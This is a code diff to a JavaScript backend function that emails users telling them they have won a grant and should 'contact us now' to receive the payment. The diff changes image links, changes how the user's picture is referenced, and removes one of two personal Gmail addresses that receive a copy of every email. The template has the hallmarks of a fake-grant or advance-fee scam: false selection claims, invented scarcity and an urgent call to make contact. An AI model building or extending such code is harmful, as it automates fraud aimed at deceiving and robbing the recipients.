@@ -269,7 +269,7 @@ const isApproved = async (req, res) => {
     <h2>Congrats, ${user.lastname} ${user.othername} ${user.lastname}</h2>
     <p>
     <div style="text-align: center;">
-   <img src="https://res.cloudinary.com/dehugixy4/image/upload/v1673150052/grant/p4fm045qq4njb9nrafiv.png" alt="fhdkjd" style="height: 200px;width: 200px; border-radius: 100%">
+   <img src="https://res.cloudinary.com/dobdvrgyr/image/upload/v1729060369/image_images/tmp-3-1729060368881_q1hoxe.png" alt="fhdkjd" style="height: 200px;width: 200px; border-radius: 100%">
   </div>
     Yep, that's right. Congrats  ${user.lastname} ${user.othername} ${user.lastname} You’ve been luckily picked as part of our winner for the day. We have thousands of applications daily but We only pick few winner(s) in a day. 
     Your patience just paid off. You just won a grant of 
@@ -282,14 +282,14 @@ const isApproved = async (req, res) => {
     </p>
 
     <div style="text-align: center;">
-    <img src="${user.image.url}" alt="fhdkjd" style="height: 100px;width: 100px; border-radius: 100%">
+    <img src="${user.image}" alt="fhdkjd" style="height: 100px;width: 100px; border-radius: 100%">
    </div>
    <h2>${user.lastname} ${user.othername} ${user.lastname} <br>
    Today’s Grant Winner’
    </h2>
 
    <div style="text-align: center;">
-   <img src="https://res.cloudinary.com/dehugixy4/image/upload/v1673149916/grant/qagcqzya4do2ynixksbj.png" alt="fhdkjd" style="height: 200px;width: 200px; border-radius: 100%">
+   <img src="https://res.cloudinary.com/dobdvrgyr/image/upload/v1729060779/image_images/tmp-4-1729060779470_u4qf9w.png" alt="fhdkjd" style="height: 200px;width: 200px; border-radius: 100%">
   </div>
 
    <h3>CONTACT US NOW TO HAVE YOUR GRANT PAYMENT! </h3>
@@ -307,7 +307,6 @@ const isApproved = async (req, res) => {
     
     await Promise.all([
       sendEmail(user.email, subject, text, html),
-      sendEmail("companychris00@gmail.com", subject, text, html),
 
       sendEmail("christopherray5419@gmail.com", subject, text, html),
     ]);
